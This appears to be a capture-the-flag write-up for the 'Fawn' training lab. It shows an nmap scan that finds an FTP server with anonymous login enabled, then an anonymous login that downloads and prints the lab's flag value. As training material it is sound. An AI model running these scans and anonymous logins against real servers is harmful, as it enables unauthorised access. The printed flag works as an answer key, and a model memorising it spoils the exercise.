# Fawn

#startingpoint #ftp #reconnaissance #anonymous/guestaccess

`nmap` scan shows `ftp` service on port 21 with **anonymous login enabled**:

```
$ nmap -sC -sV -T4 10.129.227.38
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 16:52 EDT
Nmap scan report for 10.129.227.38
Host is up (0.032s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.126
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds
```

Connecting via `ftp` and logging in with username `anonymous` and blank password:

```
$ ftp 10.129.227.38
Connected to 10.129.227.38.
220 (vsFTPd 3.0.3)
Name (10.129.227.38:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
...
ftp> ls
229 Entering Extended Passive Mode (|||25004|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
```

Reading `flag.txt`:

```
$ cat flag.txt
035db21c881520061c53e0536e44f815
```